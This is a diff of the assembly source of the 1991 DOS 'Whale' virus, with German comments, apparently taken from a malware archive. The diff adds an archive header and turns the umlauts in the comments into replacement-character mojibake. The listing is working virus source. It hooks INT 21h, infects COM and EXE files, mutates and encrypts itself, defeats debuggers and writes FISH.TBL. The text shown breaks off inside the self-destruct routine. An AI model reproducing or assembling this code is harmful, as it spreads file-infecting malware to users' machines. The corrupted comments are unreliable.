@@ -1,8 +1,19 @@
+; ------------------------------------------------------------
+; name      W
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 ;=====================================================================
 ;=====================================================================
 ;       The WHALE                                                    ;
 ;                                                                    ;
-;       Listing erstellt 1991 , R. Hîrner , Karlsruhe , FRGDR        ;
+;       Listing erstellt 1991 , R. HÔøΩrner , Karlsruhe , FRGDR        ;
 ;                                                                    ;
 ;=====================================================================
 ;=====================================================================
@@ -11,7 +22,7 @@ code            SEGMENT
                 .RADIX 16
                 ORG     100h
 ;---------------------------------------------------------------------
-;----------------( Struktur der Entscheidungs-Tabelle fÅr INT 21h )---
+;----------------( Struktur der Entscheidungs-Tabelle fÔøΩr INT 21h )---
 ;---------------------------------------------------------------------
 IF_THEN         STRUC
 WENN            DB      ?
@@ -30,7 +41,7 @@ MCODE           MACRO   Adr
 @L&Adr:
                 ENDM
 ;---------------------------------------------------------------------
-;--------------------------------------------------( fÅr Mutanten )---
+;--------------------------------------------------( fÔøΩr Mutanten )---
 L04BB5          EQU     OFFSET D4BB5
 J00000          EQU     L04BB5 - Offset Entry
 J11111          EQU     L04BB5 - Offset @INT21
@@ -65,7 +76,7 @@ FirstByte       EQU     OFFSET @FirstByte-OFFSET VirStart      ;   20h
 CODE_LEN        EQU     OFFSET LASTCODE-OFFSET @FirstByte      ; 2385H
 CODE_START      EQU     OFFSET J04BCF - OFFSET @FirstByte      ; 239FH
 ;=====================================================================
-;============================================( verÑnderlicher Code)===
+;============================================( verÔøΩnderlicher Code)===
 ;=====================================================================
 SwapCode_1      EQU     Offset Decode - Offset VirStart        ; 0A33h
 Swapcode_2      EQU     OFFSET J03A20 - Offset VirStart        ; 1210h
@@ -91,7 +102,7 @@ SS_INIT         EQU     Offset EXE_SS_INIT-Offset VirStart
 SP_INIT         EQU     Offset EXE_SP_INIT-Offset VirStart
 CODE_INIT       EQU     Offset EXE_CODE_INIT-Offset VirStart
 ;=====================================================================
-;=============================( Sprungtabelle fÅr Int 21h-Handler )===
+;=============================( Sprungtabelle fÔøΩr Int 21h-Handler )===
 ;=====================================================================
 L0699           EQU     Offset J02ea9 - Offset VirStart
 L04f4           EQU     Offset J02D04 - Offset VirStart
@@ -112,7 +123,7 @@ L1D0F           EQU     Offset J0451F - Offset VirStart
 IfDebugWal      EQU     (Offset J04B6A-Offset CreateTempCode+1) / 2
 StartDebug      EQU      Offset CreateTempCode-Offset VirStart
 ;=====================================================================
-;==========================================( ErklÑrung fehlt noch )===
+;==========================================( ErklÔøΩrung fehlt noch )===
 ;=====================================================================
 @0478           EQU     0478H
 @FB88           EQU     10000h-@0478
@@ -121,7 +132,7 @@ StartDebug      EQU      Offset CreateTempCode-Offset VirStart
 ;=====================================================================
 start:          JMP     ENTRY           ; JMP     Decode_Whale
                 DB      00h
-Whale_ID        DW      020CCh          ; kennung, da· File infiziert
+Whale_ID        DW      020CCh          ; kennung, daÔøΩ File infiziert
 ;=====================================================================
                 DB      2300h-6 DUP       (0)
 ;---------------------------------------------------------------------
@@ -134,7 +145,7 @@ Whale_ID        DW      020CCh          ; kennung, da· File infiziert
 ;
 ;       DER CODE IST Code_len BYTE LANG.
 ;
-;       AB OFFSET Code_len DöRFEN ALSO DATEN STEHEN.
+;       AB OFFSET Code_len DÔøΩRFEN ALSO DATEN STEHEN.
 ;       DESHALB GIBT ES AUCH KEINE DATEN, DIE ***VOR*** DIESEM
 ;       OFFSET ABGELEGT WERDEN !
 ;====================================================================
@@ -171,10 +182,10 @@ D2424           DD      ?               ; Adresse des exec-param-blocks
 D2428           DB      ?               ; Drive des aktuellen Files
 FileTime        DW      ?               ; File-Uhrzeit
 FileDate        DW      ?               ; File-Datum
-Trace_Adres     DD      ?               ; Temp-DD fÅr Trace-Adresse
+Trace_Adres     DD      ?               ; Temp-DD fÔøΩr Trace-Adresse
 D2431           DW      ?
 D2433           DB      ?       ; "1" : Nach Verschluesselung INT 21h
-                                ; ausfÅhren und wieder Entschluesseln.
+                                ; ausfÔøΩhren und wieder Entschluesseln.
 D2434           DB      ?
 Low_INT_21H     DD      ?               ; IBMDOS-Adresse INT 21h
 @Int_13h        DD      ?               ; Adresse INT 13h
@@ -206,10 +217,10 @@ D24B5:
 @FCB            DB      25h     DUP (?) ; FCB
 Error           DB      ?               ; ERROR aufgetreten ; 24DA
 D24DB           DW      ?
-D24DD           DW      ?               ; PLatz fÅr SS
-D24DF           DW      ?               ; Platz fÅr SP
+D24DD           DW      ?               ; PLatz fÔøΩr SS
+D24DF           DW      ?               ; Platz fÔøΩr SP
 D24E1           DW      ?
-D24E3           DW      ?               ; Platz fÅr AX
+D24E3           DW      ?               ; Platz fÔøΩr AX
 D24E4           DW      ?
 ;---------------------------------------------------------------------
 D24E6           DW      ?               ; Caller-IP ?
@@ -241,9 +252,9 @@ D2559           DW      ?               ; Orig.SS
 Vir_SP          DW      ?               ; Vir. SP
 D245D           DW      ?
 D245F           DB      ?
-D2560           DW      ?               ; Platz fÅr AX
-D2562           DW      ?               ; Platz fÅr BX
-D2564           DW      ?               ; Platz fÅr CX
+D2560           DW      ?               ; Platz fÔøΩr AX
+D2562           DW      ?               ; Platz fÔøΩr BX
+D2564           DW      ?               ; Platz fÔøΩr CX
 ;-------------------------------( als virtuelle Code-Area genutzt )---
 @INT21          DD      ?               ; ADRESSE Original INT 21H
 D256A           DW      ?
@@ -269,7 +280,7 @@ D2588           DW      ?
 D258A           DW      ?
 InfectFlag      DB      ?               ; "1" nach der ersten Infektion
 D258D           DB      ?
-D258E           DW      ?               ; Platz fÅr Flags
+D258E           DW      ?               ; Platz fÔøΩr Flags
 ;---------------------------------------------------------------------
 D2590           DW      ?               ; SAVE DX
 @INT02          DD      ?               ; Originaler INT 02
@@ -303,7 +314,7 @@ ErrorCode               DB      00h
 VIRSTART:               DB      00h             ;02810
 J02811:                 JMP     Decode_Whale
 ;=====================================================================
-;======( Puffer fÅr die ersten 1Ch Byte des infizierten Programmes)===
+;======( Puffer fÔøΩr die ersten 1Ch Byte des infizierten Programmes)===
 ;=====================================================================
 EXE_ID:                 DW      04CB4H          ; 'MZ'      / MOV AH,4C
 EXE_LastBytes:          DW      021CDH          ; Lastbytes / INT 21
@@ -351,7 +362,7 @@ J02852:         JZ      J0287E                  ; = RET nach altem BX
 ;=====================================================================
 ;==================( folgender Code wird an Adresse 2566h erzeugt )===
 ;=====================================================================
-;@INT21:        DW      2568h           ; fÅr "call word ptr [@int21]"
+;@INT21:        DW      2568h           ; fÔøΩr "call word ptr [@int21]"
 ;D2568:         PUSHF
 ;               CALL    FAR CS:[Low_INT_21H]  ; CALL OLD INT 21
 ;               RET
@@ -374,8 +385,8 @@ J02887:         PUSH    CX
                 DB      2eh,8bh,1Eh
 ;=====================================================================
 ;====================================( Teil-Initialisierung von SI)===
-;====================================( IRET fÅhrt nach J02983     )===
-;====================================( Wird als erstes ausgefÅhrt )===
+;====================================( IRET fÔøΩhrt nach J02983     )===
+;====================================( Wird als erstes ausgefÔøΩhrt )===
 ;=====================================================================
 J0288E:         POP     BX
                 ADD     BX,OFFSET J02983-Offset Vir_NAME
@@ -412,8 +423,8 @@ J028B3:         MOV     BX,OFFSET J03047-Offset VirStart
                 ADD     BX,+02h
                 XOR     WORD Ptr DS:[BX],4568h
                 MOV     SI,OFFSET J0491A-OFFSET VirStart
-                POP     DS                        ; Altes DS zurÅck
-                CALL    PATCH                     ; Gleich ausfÅhren !
+                POP     DS                        ; Altes DS zurÔøΩck
+                CALL    PATCH                     ; Gleich ausfÔøΩhren !
 ;=====================================================================
 ;======================================( WAL ist jetzt erst scharf)===
 ;=====================================================================
@@ -438,7 +449,7 @@ AFTER_PATCH:    MDECODE  1
 
                 MOV     DX,Offset Int_01_entry-Offset VirStart
                 MOV     AL,01h
-                MOV     BYTE Ptr DS:[D2450],00h    ; keinen Åbergehen
+                MOV     BYTE Ptr DS:[D2450],00h    ; keinen ÔøΩbergehen
                 CALL    SetInt_AL                  ; SET INT 01
                 MCODE   1
 ;=====================================================================
@@ -545,7 +556,7 @@ J029BC:         MCODE   4
                 RETN
 ;=====================================================================
 ;==========================( Erste Routine, die im Oberen Speicher)===
-;==========================( ausgefÅhrt wird.                     )===
+;==========================( ausgefÔøΩhrt wird.                     )===
 ;==========================( AB JETZT ist Offset 2810h = OFFSET 0 )===
 ;=====================================================================
 J029C1:         MDECODE 5
@@ -658,9 +669,9 @@ J02A7D:
         DB      0EBh,2Eh,80h,0fh
         DB      0abh,0e2h,0f9h
 ;=====================================================================
-;---( Hier wird der Code neu reloziert, so da· Virstart zum       )---
+;---( Hier wird der Code neu reloziert, so daÔøΩ Virstart zum       )---
 ;---( Offset 0 wird. Dazu wird das neue Codesegment errechnet und )---
-;---( spÑter Åber RETF angesprungen. Die Routine muss ausgefÅhrt  )---
+;---( spÔøΩter ÔøΩber RETF angesprungen. Die Routine muss ausgefÔøΩhrt  )---
 ;---( werden, bevor der Code scharf gemacht wird. Der Patcher     )---
 ;---( geht vom neuen Codesegment aus.                             )---
 ;=====================================================================
@@ -802,17 +813,17 @@ J02BB6:         DB      0D7h,03Ch,0FFh,075h
 ;=====================================================================
 ;=============================================( Pop alle Register )===
 ;=====================================================================
-; ---------------- hilfsweise eingefÅgt :
+; ---------------- hilfsweise eingefÔøΩgt :
 ;       J02BB6: XLAT
 ;               CMP     AL,0FFh
 ;               JZ      J02BA3
 ;               XCHG    AL,BYTE PTR DS:[0C912H] ; MUELL !!!
 ;               JMP     J02BBF
-; ---------------- hilfsweise eingefÅgt :
+; ---------------- hilfsweise eingefÔøΩgt :
 ;       J02BBC: PUSH    ES
 ;               ADC     CL,CL
 ;               JMP     J02BBF
-; ---------------- Ende einfÅgung
+; ---------------- Ende einfÔøΩgung
 ;=====================================================================
 ;=============================================( Pop alle Register )===
 ;=====================================================================
@@ -985,12 +996,12 @@ J02CDA          EQU     $+1     ; = INC  SI
                 POP     AX                 ; AX = "E9CF"
                 XOR     AX,020Ch           ; AX = "EBC3"
                 MOV     CS:[BX],AL ; PATCHT INT 3 WEG : INT 3 -> RET
-                                   ; Spielt aber gefÑhrlich mit der Queue,
+                                   ; Spielt aber gefÔøΩhrlich mit der Queue,
                                    ; kein Wunder, dass das Teil auf ATs
                                    ; nicht funktioniert...
                 ADD     AX,020Ch   ; AX = EDCF
 ;*********************************************************************
-CALL    EIN_RETURN      ;************ EingefÅgt **********************
+CALL    EIN_RETURN      ;************ EingefÔøΩgt **********************
 ;*********************************************************************
 J02CFF:         INT     3          ; ->  RET
                                    ; ABER RET [SP+2] !!!!!
@@ -1000,7 +1011,7 @@ J02CFF:         INT     3          ; ->  RET
 J02D00:         JMP     J02D60
                 DB      0EBh
 ;=====================================================================
-;====================( Handler fÅr Findfirst/Findnext FCB / AH=11 )===
+;====================( Handler fÔøΩr Findfirst/Findnext FCB / AH=11 )===
 ;=====================================================================
 J02D04:         MDECODE 19
                 CALL    PopALL
@@ -1119,7 +1130,7 @@ J02E9F:         CALL    PopALL
 J02EA3:         CALL    PopALL
                 JMP     IRET_Int21h
 ;=====================================================================
-;================================( Handler fÅr OPEN FCB , AH = 0F )===
+;================================( Handler fÔøΩr OPEN FCB , AH = 0F )===
 ;=====================================================================
 J02EA9:         MDECODE 24
                 CALL    PopALL
@@ -1139,11 +1150,11 @@ J02EA9:         MDECODE 24
                 SBB     BYTE Ptr DS:[BX+12h],00h
                 JMP     J02EA3          ; fertig
 ;=====================================================================
-;=============================( Handler fÅr Read Random Block FCB )===
+;=============================( Handler fÔøΩr Read Random Block FCB )===
 ;=====================================================================
 J02ED8:         JCXZ    J02F08
 ;=====================================================================
-;===================================( Handler fÅr Read Random FCB )===
+;===================================( Handler fÔøΩr Read Random FCB )===
 ;=====================================================================
 J02EDA:         MDECODE 25
                 MOV     BX,DX
@@ -1154,17 +1165,17 @@ J02EDA:         MDECODE 25
                 JMP     J02F03
                 DB      0e8h
 ;=====================================================================
-;================================( Handler fÅr Read Seq. FCB.AH=14)===
+;================================( Handler fÔøΩr Read Seq. FCB.AH=14)===
 ;=====================================================================
 J02EF0:         MDECODE 26
-                MOV     BX,DX       ; DS:DX ist Adresse des geîffneten FCB
+                MOV     BX,DX       ; DS:DX ist Adresse des geÔøΩffneten FCB
                 MOV     AX,[BX+0Ch] ;
 J02EFA:         OR      AL,[BX+20h]
                 MCODE   26
                 JNZ     J02F08
 
 J02F03:         CALL    J0397A          ; SAVEREGS,ES=DS, DI=DX+0Dh
-                JNB     J02F55          ; Datei ist ausfÅhrbar
+                JNB     J02F55          ; Datei ist ausfÔøΩhrbar
 J02F08:         JMP     J02B8B          ; sonst : CALL LOW-INT-21
 ;=====================================================================
 J02F0B:         JMP     J03251          ; -> J034D4
@@ -1201,7 +1212,7 @@ J02F33:         SUB     SI,@FB88        ; ADD SI,478h; SI = 2C88
                                         ; DS = 0000
                 CALL    J02AD2          ;
                                         ; 2F3A auf Stack als ret-adr
-                ;------>(J02EC8)----[keine RÅckkehr vom CALL ! ]------
+                ;------>(J02EC8)----[keine RÔøΩckkehr vom CALL ! ]------
                 ;-----------------------------------------------------
                 DB      0E9H
 ;=====================================================================
@@ -1222,7 +1233,7 @@ J02F43: MOV     WORD PTR DS:[0004h],BX
 ;--------------------------------------------------------------------
         DB      1Ch,00,53h,57h,0E8h
 ;=====================================================================
-;============================( zum Handler fÅr Read Seq. FCB.AH=14)===
+;============================( zum Handler fÔøΩr Read Seq. FCB.AH=14)===
 ;=====================================================================
 J02F55:         MDECODE 27
                 CALL    CS:[@INT21]         ; CALL INT 21h
@@ -1271,21 +1282,21 @@ J02FA2:
 
 
 J02FC0:         ADD     SI,@0478
-                CALL    J02AD2          ; ->keine RÅckkehr vom CALL !<-
+                CALL    J02AD2          ; ->keine RÔøΩckkehr vom CALL !<-
 ;-------------------------------------------------------------------
                 DB      0E9H,0A8h,09h,0EAh
 ;-------------------------------------------------------------------
 J02FCB:         JMP     J03251          ; -> 34d4
-;=====================( no entry )==( muss (!) ausgefÅhrt werden )===
+;=====================( no entry )==( muss (!) ausgefÔøΩhrt werden )===
 J02FCE:         MOV     BYTE PTR CS:[SI+SwapCode_5],0E8h
                                         ; Adresse J03259
                 OR      CX,CX           ; Ist am anfang immer 20h
                                         ; also wird 32 Mal diese Schleife
-                                        ; ausgefÅhrt und versucht, den
+                                        ; ausgefÔøΩhrt und versucht, den
                                         ; INT 1 zu setzen.....
                 JZ      J02FCB          ; Zur Arbeit !
                 ;---------------------------------------------------
-                ; INT 1 und INT 3 zerstîren.
+                ; INT 1 und INT 3 zerstÔøΩren.
                 ;---------------------------------------------------
                 MOV     Word Ptr DS:[000Ch],BX
                 XOR     DX,BX
@@ -1297,7 +1308,7 @@ J02FCE:         MOV     BYTE PTR CS:[SI+SwapCode_5],0E8h
 J02FEA:         DB      081h,0c6h,090h,034h,0b9h,01ch
                 DB      000h,0f4h,0a4h,033h,0c9h,0e8h
 ;=====================================================================
-;============================( zum Handler fÅr Read Seq. FCB.AH=14)===
+;============================( zum Handler fÔøΩr Read Seq. FCB.AH=14)===
 ;=====================================================================
 J02FF6:         MDECODE 29
                 POP     DX
@@ -1425,7 +1436,7 @@ PATCH:          PUSH    BX
                 POP     BX
                 RETN
 ;=====================================================================
-;=================================( Handler fÅr GET FILESIZE /FCB )===
+;=================================( Handler fÔøΩr GET FILESIZE /FCB )===
 ;=====================================================================
 J030DF:         MDECODE 30
                 PUSH    CS
@@ -1515,7 +1526,7 @@ Re_SET_Int_02:  MDECODE 33
                 CALL    PushALL
 
                 IN      AL,21h
-                AND     AL,0FDh             ; lîsche Bit 2
+                AND     AL,0FDh             ; lÔøΩsche Bit 2
                 OUT     21h,AL
 
                 LDS     DX,CS:[@INT02]     ; OLD INT 02
@@ -1525,10 +1536,10 @@ Re_SET_Int_02:  MDECODE 33
                 MCODE   33
                 RETN
 ;=====================================================================
-;================================( Handler fÅr Open File / Handle )===
+;================================( Handler fÔøΩr Open File / Handle )===
 ;=====================================================================
 J031A6:         CALL    GET_Current_PSP
-                CALL    J039C3          ; ist die Datei ausfÅhrbar ?
+                CALL    J039C3          ; ist die Datei ausfÔøΩhrbar ?
                 JB      J031F1          ; nein....
                 CMP     BYTE PTR CS:[D24A2],00h ; hab ich schon infiziert
                 JZ      J031F1
@@ -1542,7 +1553,7 @@ J031A6:         CALL    GET_Current_PSP
                 POP     ES
 
                 MOV     CX,0014h
-                MOV     DI,Offset D2452 ; ja ? wenn ich's wÅsst...
+                MOV     DI,Offset D2452 ; ja ? wenn ich's wÔøΩsst...
                 XOR     AX,AX
                 REPNZ   SCASW
 
@@ -1552,14 +1563,14 @@ J031A6:         CALL    GET_Current_PSP
                 MOV     [BP-04h],BX
                 MCODE   34
 
-J031E7:         AND     BYTE PTR CS:[D24B3],0FEh        ; CF lîschen
+J031E7:         AND     BYTE PTR CS:[D24B3],0FEh        ; CF lÔøΩschen
                 JMP     J02EA3          ; fertig
 
                 DB      0E8h
 
 J031F1:         JMP     J02B8B  ; CALL LOW_INT_21
 ;=====================================================================
-;===============================( Handler fÅr CLOSE FILE / Handle )===
+;===============================( Handler fÔøΩr CLOSE FILE / Handle )===
 ;=====================================================================
 J031F4:         MDECODE 35
                 PUSH    CS
@@ -1616,17 +1627,17 @@ Decode:         JMP     J0491B          ; CMP     AX,16D5H
 ;=====( SP sichern in BP                                          )===
 ;=====( "C353" auf den Stack, wobei SS=CS & C353 = "PUSH BX, RET" )===
 ;=====( Dann ein CALL dessen RET-Adresse vom Stack geholt wird.   )===
-;=====( DafÅr wird DX alias BP auf den Stack gelegt. Kuckuck !    )===
+;=====( DafÔøΩr wird DX alias BP auf den Stack gelegt. Kuckuck !    )===
 ;=====( Schliesslich wird nach SS:SP-2, also "PUSH BX, RET",      )===
-;=====( gesprungen, also ein "RET" zur Adresse J034D4 ausgefÅhrt  )===
+;=====( gesprungen, also ein "RET" zur Adresse J034D4 ausgefÔøΩhrt  )===
 ;=====(-----------------------------------------------------------)===
-;=====( Kein Wunder, da· der Wal nach Fischen sucht ;-)))         )===
+;=====( Kein Wunder, daÔøΩ der Wal nach Fischen sucht ;-)))         )===
 ;=====================================================================
 J03251:         MOV     DX,BP                   ; DX = BP
                 MOV     BP,SP
                 MOV     BX,0C353H
                 PUSH    BX
-J03259:         CALL    J0341A                  ; ursprÅnglich "INT 3"
+J03259:         CALL    J0341A                  ; ursprÔøΩnglich "INT 3"
 J0325C          DB      0BBH
 ;----------------------------------------------------------( Info )---
 ;       J0341A: POP     BX                              ; BX = 325C
@@ -1639,7 +1650,7 @@ J0325C          DB      0BBH
 ;     SS:SP-2   PUSH   BX       ; = 53h
 ;     SS:SP-1   RET             ; = C3h
 ;=====================================================================
-;==============================================( Handler fÅr EXEC )===
+;==============================================( Handler fÔøΩr EXEC )===
 ;=====================================================================
 J0325D:         OR      AL,AL   ; Ist AL = 0 ( = Load + execute ) ?
                 JZ      J03264  ; JA !!
@@ -1666,7 +1677,7 @@ J03264:         MDECODE 37
                 MOV     DI,Offset Cmd_Line
                 REPZ    MOVSB
 
-                MOV     BX,0FFFFh               ; wird wieder zerstîrt
+                MOV     BX,0FFFFh               ; wird wieder zerstÔøΩrt
                 CALL    PopALL
                 POP     BP                      ; Original-BP
                 POP     CS:[D24E6]              ; CALLERs IP
@@ -1689,7 +1700,7 @@ J03264:         MDECODE 37
                 PUSH    CS:[D24E8]              ; CS
                 PUSH    CS:[D24E6]              ; IP
                 PUSH    BP
-                LES     BX,DWord ptr CS:[D2424] ; Alten EPB zurÅck
+                LES     BX,DWord ptr CS:[D2424] ; Alten EPB zurÔøΩck
                 MOV     BP,SP                   ; Alten SP
                 JMP     IRET_Int21h             ; und fertig
 ;======================================================
@@ -1844,7 +1855,7 @@ J03428:         MDECODE 41
                 PUSH    CS
                 POP     DS
                 MOV     DX,Offset Cmd_Line
-                CALL    J039C3          ; ist die Datei ausfÅhrbar ?
+                CALL    J039C3          ; ist die Datei ausfÔøΩhrbar ?
                 CALL    J043B1          ; Vorarbeiten
                 INC     BYTE PTR CS:[D24EF]
                 CALL    J03642          ; infizieren
@@ -1905,7 +1916,7 @@ J034AF:         MDECODE 43                      ; SI zeigt auf COM-START
 J034D4:         MOV     BYTE PTR CS:[SI+SwapCode_2],0E9h
                                         ; JMP bei 3A20 erzeugen !!
                 POP     BP              ; BP = 20h
-                MOV     CX,0004h        ; Das nÑchste RET macht wieder
+                MOV     CX,0004h        ; Das nÔøΩchste RET macht wieder
                                         ; "PUSH BX,RET"
                 MOV     BX,DS           ; BX = DS
                 OR      BX,BP           ; BX = DS or 20h
@@ -1929,7 +1940,7 @@ J034ED:         ADD     AH,[BX]
                 SHR     BH,1
                 JMP     J03919
 ;=====================================================================
-;================================================( Gehîrt zu EXEC )===
+;================================================( GehÔøΩrt zu EXEC )===
 ;=====================================================================
 J034FC:         CMP     AL,01h  ; AX = 4B01 ( durch Debugger und Wal )
                 JZ      J03510  ; ja  , durch Debugger und Wal.
@@ -1959,13 +1970,13 @@ J03510:         MDECODE 44
                 CALL    PopALL
                 CALL    CS:[@INT21]           ; int 21h rufen
                 CALL    PushALL
-                LES     BX,DWord ptr CS:[D2424]         ; EPB zurÅck
+                LES     BX,DWord ptr CS:[D2424]         ; EPB zurÔøΩck
                 LDS     SI,DWord ptr ES:[BX+12h]        ; CS:IP holen
                 MCODE   44
                 JNB     J03542          ; ---> Infektion
                 JMP     J035E0          ; ---> fertig
 ;=========================================================()========
-J03542:         AND     BYTE PTR CS:[D24B3],0FEh; CF lîschen
+J03542:         AND     BYTE PTR CS:[D24B3],0FEh; CF lÔøΩschen
                 CMP     SI,+01h                 ; ist IP-INIT=1 (infiziert)
                 JZ      J0358E
                 MDECODE 45
@@ -2039,7 +2050,7 @@ J035E3: MOV     WORD PTR CS:[023Ah],CS          ;2a4a
         MOV     WORD PTR CS:[023Eh],SP          ;2a4e
         MOV     BYTE PTR CS:[0239h],01h         ;2a49
         PUSH    DS
-        POP     AX                              ; ist auch bloss MÅll !
+        POP     AX                              ; ist auch bloss MÔøΩll !
 ;=====================================================================
 ;=================================( Kontrolle des Verfalls-Datums )===
 ;=====================================================================
@@ -2079,11 +2090,11 @@ J03642:         MDECODE 50
                 ;--------------------------------------------------
                 CALL    Trace_int_13h
 
-                CALL    J0378C  ; errechnet unter anderem Paras fÅr File
-                                ; SI = benîtigte Paragrafen
+                CALL    J0378C  ; errechnet unter anderem Paras fÔøΩr File
+                                ; SI = benÔøΩtigte Paragrafen
                                 ; CX = 10h
                                 ; DX:AX = Filesize gerundet
-                                ; auf nÑchsten Paragrafen
+                                ; auf nÔøΩchsten Paragrafen
 
                 MOV     BYTE Ptr DS:[OFFSET EXE_FLAG-Offset VirStart],01h
                 CMP     WORD Ptr DS:[CodBuf],'MZ'
@@ -2101,9 +2112,9 @@ J03642:         MDECODE 50
 J0367E:         MDECODE 51
                 MOV     AX,WORD PTR DS:[CodBuf+4]   ; Pages
                 SHL     CX,1            ; CX = 20h
-                MUL     CX              ; AX ist ((LÑnge-1) div 200h)*20h
-                                        ; Also jetzt : (LÑnge-1) DIV 10H
-                                        ; AX enthÑlt die benîtigte Anzahl
+                MUL     CX              ; AX ist ((LÔøΩnge-1) div 200h)*20h
+                                        ; Also jetzt : (LÔøΩnge-1) DIV 10H
+                                        ; AX enthÔøΩlt die benÔøΩtigte Anzahl
                                         ; Paragrafen, um EXE zu laden.
                 ADD     AX,0200h        ; AX=AX+200h, gibt keinen Sinn
                 CMP     AX,SI           ; Vergleiche AX mit Max-Paras
@@ -2122,7 +2133,7 @@ J0367E:         MDECODE 51
                 MCODE   52
                 JZ      J036B8          ; ja..
                 INC     AX
-J036B8:         MOV     WORD PTR DS:[CodBuf+2  ],DX     ; LÑnge LastPage
+J036B8:         MOV     WORD PTR DS:[CodBuf+2  ],DX     ; LÔøΩnge LastPage
                 MOV     WORD PTR DS:[CodBuf+4  ],AX     ; Anzahl Pages
                 CMP     WORD PTR DS:[CodBuf+14h],+01h   ; IP-Init = 1?
                 JNZ     J036CA                          ; ( Whale !)
@@ -2149,7 +2160,7 @@ J036CA:         CALL    Check_Verfallsdatum
                 CALL    Infect_File
 J036F6:         JMP     J03761
 ;=====================================================================
-;=======================================( Verfahren fÅr COM-Files )===
+;=======================================( Verfahren fÔøΩr COM-Files )===
 ;=====================================================================
 J036F9:         CMP     SI,0F00h        ; COM-Size > 61440 Byte ?!?
                 JNB     J03761          ; Dann geht es eben nicht ...
@@ -2183,7 +2194,7 @@ J036F9:         CMP     SI,0F00h        ; COM-Size > 61440 Byte ?!?
                 MOV     CL,0E9h
                 MOV     AX,0010h
                 MOV     BYTE PTR DS:[CodBuf],CL
-                MUL     SI                       ; AX = COM-LÑnge in Byte,
+                MUL     SI                       ; AX = COM-LÔøΩnge in Byte,
                                                  ; auf ganzen Paragrafen
                                                  ; gerundet
                 ADD     AX,23B9h                 ; So weit also + 3 Byte
@@ -2218,7 +2229,7 @@ J03761:         MDECODE 56
                 MCODE   56              ; Alles ist so wie vorher...
                 RETN
 ;=====================================================================
-;====================================( Vorbereitung fÅr Infektion )===
+;====================================( Vorbereitung fÔøΩr Infektion )===
 ;=====================================================================
 J0378C:         MDECODE 57
                 PUSH    CS
@@ -2259,11 +2270,11 @@ J0378C:         MDECODE 57
 
                 MOV     DI,AX           ; BEISPIEL : AX=9273 -> DI=9273
                 ADD     AX,000Fh        ; AX=9282
-                ADC     DX,+00h         ; öbertrag nach DX
+                ADC     DX,+00h         ; ÔøΩbertrag nach DX
                 AND     AX,0FFF0h       ; AX=9280
                 SUB     DI,AX           ; DI=FFF3
                 MOV     CX,0010h        ; CX=10
-                DIV     CX              ; AX=928 = Anzahl Paras fÅr File
+                DIV     CX              ; AX=928 = Anzahl Paras fÔøΩr File
                 MOV     SI,AX           ; SI=928
                 MCODE   57
                 RETN
@@ -2272,7 +2283,7 @@ J0378C:         MDECODE 57
 ;=====================================================================
 Infect_File:    MDECODE 58
 ;*****************************************
-JMP CODE_58     ;************************* e-i-n-g-e-f-Å-g-t-
+JMP CODE_58     ;************************* e-i-n-g-e-f-ÔøΩ-g-t-
 ;*****************************************
 
                 XOR     CX,CX
@@ -2302,13 +2313,13 @@ JMP CODE_58     ;************************* e-i-n-g-e-f-Å-g-t-
                 CALL    Mutate_Whale            ; Mutieren
 
                 CALL    @10_Prozent             ; jedes 10. Mal Wal
-                                                ; zerstîren
+                                                ; zerstÔøΩren
                 CALL    Suche_Fish              ; Jedes 4. Mal FISH.TBL
                                                 ; schreiben
 
                 MOV     BYTE Ptr DS:[InfectFlag],01h ; "habe infiziert"
-                MOV     BYTE Ptr DS:[D2433],01h ; VerschlÅsseln, schreiben,
-                                                ; entschlÅsseln !
+                MOV     BYTE Ptr DS:[D2433],01h ; VerschlÔøΩsseln, schreiben,
+                                                ; entschlÔøΩsseln !
 
                 PUSH    BX
                 PUSH    ES
@@ -2320,7 +2331,7 @@ JMP CODE_58     ;************************* e-i-n-g-e-f-Å-g-t-
 
                 MOV     SI,OFFSET J0491A - Offset VirStart
                 ;-----------------------------------------------------
-                ;----------------------------( Wal-Code zerstîren )---
+                ;----------------------------( Wal-Code zerstÔøΩren )---
                 ;-----------------------------------------------------
                 MOV     BYTE Ptr DS:[SwapCode_5],0CCh   ; 3259  , 0e8h
                 MOV     BYTE Ptr DS:[SwapCode_2],0C6h   ; 3A20  , 0e9h
@@ -2329,23 +2340,23 @@ JMP CODE_58     ;************************* e-i-n-g-e-f-Å-g-t-
                 CALL    Kill_Int_Table  ; nur eine einzige Infektion
 Code_58:        MCODE   58              ; pro Session !
 ;=====================================================================
-;============================================( Zerstîren des Wals )===
+;============================================( ZerstÔøΩren des Wals )===
 ;=====================================================================
                 CALL    PATCH                   ; gepatchten code
-                                                ; zerstîren
+                                                ; zerstÔøΩren
                 MOV     SI,SWAPCODE_4
-                XOR     WORD Ptr DS:[SI],0EF15h ; PATCH zerstîren
+                XOR     WORD Ptr DS:[SI],0EF15h ; PATCH zerstÔøΩren
                 ADD     SI,+02h
                 XOR     WORD Ptr DS:[SI],4568h  ; ---""-----------
                 MOV     BYTE Ptr DS:[SwapCode_1],03Dh
-                                                ; DECODE zerstîren
+                                                ; DECODE zerstÔøΩren
                 ;=====( eigentliche infektion )=======================
                                            ;=========================;
                 CALL    Code_Whale         ; Whale kodieren          ;
-                                           ; aber NICHT LauffÑhig !! ;
+                                           ; aber NICHT LauffÔøΩhig !! ;
                                            ;=========================;
 
-                ;-------------------------( und rÅckgÑngig machen )---
+                ;-------------------------( und rÔøΩckgÔøΩngig machen )---
                 MOV     Byte Ptr DS:[SwapCode_1],0E9h
                 XOR     WORD Ptr DS:[SI],4568h
                 SUB     SI,+02h
@@ -2373,7 +2384,7 @@ CODE_59:
                 MCODE   59
                 RETN
 ;=====================================================================
-;===========================( Den Whale-Code zerstîren , bei der  )===
+;===========================( Den Whale-Code zerstÔøΩren , bei der  )===
 ;===========================( Infektion jedes 10. COM-Files       )===
 ;===========================( Zweck :  Geburtenkontrolle !        )===
 ;=====================================================================
@@ -2384,16 +2395,16 @@ CODE_59:
                 JNZ     J0390E          ; Jmp, wenn EXE-File
 
                 IN      AL,40h
-                CMP     AL,19h          ; 90 % liegen Åber 19h
+                CMP     AL,19h          ; 90 % liegen ÔøΩber 19h
                 JNB     J0390E          ; fertig, nichts weiter tun
-;-------------------------------------( Wal zerstîrt seinen Code )---
+;-------------------------------------( Wal zerstÔøΩrt seinen Code )---
                 INC     BYTE PTR CS:[TrashFlag]; ist jetzt "1"
                 MOV     BX,000Ah
                 MOV     CX,0016h
 
